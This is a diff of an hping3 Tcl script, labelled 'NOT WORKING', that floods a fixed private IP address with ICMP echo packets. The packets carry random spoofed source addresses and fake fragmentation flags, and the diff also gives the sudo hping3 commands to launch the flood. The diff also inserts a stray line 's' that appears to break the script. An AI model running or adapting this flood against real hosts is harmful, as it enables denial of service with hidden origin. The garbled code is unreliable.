@@ -1,24 +1,19 @@
 # Hping3 ICMP Fake Fragment Flood (no real fragmentation)
 # NOT WORKING
 
-# Simulates fragmented ICMP packets by manipulating fragoff and MF flag
-
 set dst_ip "192.168.100.2"
 set count 0
-
-# Generate random IP address
+s
 proc random_ip {} {
     return "[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}]"
 }
 
-# Main flood loop
 while {1} {
     set saddr [random_ip]
 
-    # Fake fragmentation fields:
     # fragoff=64 
-    # mf=1      → "More fragments" (mesmo sem fragmentação real)
-    # id random to simulate multiple fake-fragments
+    # mf=1 "More fragments" (mesmo sem fragmentação real)
+    # id random
     set frag_id [expr {int(rand()*65535)}]
 
     set pkt "ip(saddr=$saddr,daddr=$dst_ip,ttl=64,id=$frag_id,fragoff=64,mf=1)+icmp(type=8,code=0)"
@@ -31,6 +26,6 @@ while {1} {
     }
 }
 
-# Run with:
+# Comandos:
 # sudo hping3 exec icmp_fake_frag.htcl
 # sudo hping3 -1 192.168.100.2 -x -g 64 --flood
